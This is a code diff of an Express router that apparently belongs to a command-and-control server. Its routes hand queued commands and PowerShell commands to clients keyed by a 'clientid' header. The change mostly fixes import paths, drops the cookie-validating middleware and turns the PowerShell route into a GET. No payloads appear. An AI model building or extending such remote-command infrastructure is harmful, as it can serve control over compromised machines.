@@ -1,19 +1,14 @@
 const router = require('express').Router();
 const Command = require('../commands.model');
-const Utils = require('../../Utils/utilFunctions');
-const toolCookieValidator = require('../../Utils/MiddleWears/toolCookieValidator');
+const Utils = require('../../../Utils/UtilFunctions/utilFunctions');
+const toolCookieValidator = require('../../../Utils/MiddleWears/toolCookieValidator');
 const psCommand = require('../pscommand.model');
 const formidable = require('express-formidable');
-const Client = require('../../Clients/client.model')
-const ClientUtils = require("../../Utils/clientUtils");
-const base64Decode = require('../../Utils/MiddleWears/base64')
+const Client = require('../../tool.model')
+const ClientUtils = require("../../../Utils/UtilFunctions/clientUtils");
+const base64Decode = require('../../../Utils/MiddleWears/base64')
 const express = require("express");
-const {LogToFile} = require("../../Utils/utilFunctions");
-
-router.use(toolCookieValidator);
-router.use(base64Decode);
-router.use(express.json());
-
+const {LogToFile} = require("../../../Utils/UtilFunctions/utilFunctions");
 
 //Give client a command + update check in
 router.route('/h2').get((req, res) => {
@@ -44,9 +39,8 @@ router.route('/h2').get((req, res) => {
 
 });
 
-
 //get a powershell command
-router.route('/ps').post((req, res) => {
+router.route('/ps').get((req, res) => {
     try {
         let clientId = req.headers['clientid'];
         psCommand.findOneAndDelete({client_id: clientId}, function (err, command) {
@@ -70,7 +64,6 @@ router.route('/ps').post((req, res) => {
         res.status(400).send("No command");
     }
 });
-
 
 router.use(formidable())
 
